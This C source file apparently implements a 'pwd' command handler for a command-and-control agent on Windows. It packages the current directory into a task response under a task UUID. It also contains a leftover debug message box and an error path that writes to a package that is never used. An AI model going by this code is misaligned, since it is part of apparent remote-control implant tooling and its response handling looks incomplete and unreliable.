#include "WrapPwd.h"
#include "BasePwd.h"
#include <windows.h>

BOOL wrapPwd(PParser arguments)
{
    // Debug message
    MessageBoxA(NULL, "wrapPwd function called", "Info", MB_OK);

    SIZE_T uuidLength = 36;
    PCHAR taskUuid = getString(arguments, &uuidLength);

    PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
    addString(responseTask, taskUuid, FALSE);

    PPackage output = newPackage(0, FALSE);
    
    char result[MAX_PATH_SIZE];
    BOOL success = basePwd(result, MAX_PATH_SIZE);

    if (!success)
    {
        addString(output, "[PWD] Error getting current working directory!\n", FALSE);
    }
    else
    {
        // Add the result to the output package
        addBytes(responseTask, (PBYTE)result, CustomStrLen(result), TRUE);
    }

    // Return the success status
    return success;
}